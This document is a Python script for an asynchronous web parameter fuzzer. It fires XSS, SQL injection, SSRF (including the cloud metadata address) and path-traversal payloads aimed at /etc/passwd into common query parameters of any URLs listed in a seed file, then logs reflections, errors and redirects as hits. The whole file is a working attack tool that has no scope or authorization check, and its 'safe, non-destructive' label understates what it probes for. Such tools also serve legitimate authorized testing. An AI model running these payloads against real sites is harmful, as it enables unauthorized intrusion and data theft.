#!/usr/bin/env python3
# async_param_fuzzer.py
# Usage:
# python3 async_param_fuzzer.py --input seed_urls.txt --outdir out/example.com --concurrency 30

import argparse
import asyncio
import aiohttp
import os
import urllib.parse

# ------------------ Payload Sets ------------------ #
XSS_PAYLOADS = [
    '"><script>alert(1)</script>',
    "'\"><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>"
]
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "';--",
    "\" OR \"\"=\""
]
SSRF_PAYLOADS = [
    "http://127.0.0.1:8000/",
    "http://169.254.169.254/",
    "http://localhost:8080/"
]

COMMON_PARAMS = [
    "id", "user_id", "userid", "uid", "token", "auth_token", "session",
    "session_id", "next", "redirect", "url", "return_to", "file",
    "filename", "path", "email", "username", "callback", "q"
]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (compatible; param-fuzzer/1.1)",
    "Accept": "*/*"
}


# ------------------ Core Fuzzing Logic ------------------ #
async def try_param(session, base_url, param, payload, outfh, sem):
    """Send GET request with payload in parameter and log interesting responses."""
    async with sem:
        parsed = urllib.parse.urlparse(base_url)
        qs = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
        qs[param] = payload
        new_qs = urllib.parse.urlencode(qs, doseq=True)
        new_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))

        try:
            async with session.get(new_url, timeout=15, allow_redirects=False) as resp:
                text = await resp.text(errors='ignore')
                if payload in text or resp.status >= 500 or resp.status in (301, 302):
                    await outfh.write(f"[HIT] {resp.status} {new_url}\n")
                else:
                    await outfh.write(f"[OK]  {resp.status} {new_url}\n")
        except Exception as e:
            await outfh.write(f"[ERR] {new_url} -> {e}\n")
        await outfh.flush()


async def fuzz_url(session, url, outdir, concurrency):
    """Run parameter fuzzing for a single target URL."""
    outfile = os.path.join(outdir, "fuzzer_hits.txt")
    os.makedirs(outdir, exist_ok=True)

    try:
        import aiofiles
        async with aiofiles.open(outfile, mode='a') as outfh:
            sem = asyncio.Semaphore(concurrency)
            tasks = []

            for param in COMMON_PARAMS:
                # Select payload sets based on param type
                if param in ("id", "user_id", "userid", "uid"):
                    payloads = SQLI_PAYLOADS + SSRF_PAYLOADS
                elif param in ("next", "redirect", "url", "return_to", "callback"):
                    payloads = SSRF_PAYLOADS + XSS_PAYLOADS
                elif param in ("token", "auth_token", "session", "session_id"):
                    payloads = ["../../etc/passwd", "admin' --"]
                elif param in ("file", "filename", "path"):
                    payloads = ["../../../../etc/passwd", "/etc/passwd", "/var/www/html/shell.php"]
                else:
                    payloads = XSS_PAYLOADS + SQLI_PAYLOADS

                for p in payloads:
                    tasks.append(
                        asyncio.create_task(try_param(session, url, param, p, outfh, sem))
                    )

            await asyncio.gather(*tasks)

    except Exception as e:
        print(f"[!] Error writing to file {outfile}: {e}")


# ------------------ Main Runner ------------------ #
async def main(args):
    targets = []
    with open(args.input, 'r') as fh:
        for line in fh:
            line = line.strip()
            if not line:
                continue
            if not line.startswith("http"):
                line = "https://" + line
            targets.append(line)

    async with aiohttp.ClientSession(headers=HEADERS) as session:
        for url in targets:
            print(f"[*] Fuzzing {url} ...")
            await fuzz_url(session, url, args.outdir, args.concurrency)


# ------------------ Entry Point ------------------ #
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Asynchronous parameter fuzzer (safe, non-destructive)")
    parser.add_argument("--input", required=True, help="File with seed URLs/hosts")
    parser.add_argument("--outdir", default="./out", help="Output directory")
    parser.add_argument("--concurrency", type=int, default=20, help="Number of concurrent requests")
    args = parser.parse_args()

    try:
        asyncio.run(main(args))
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
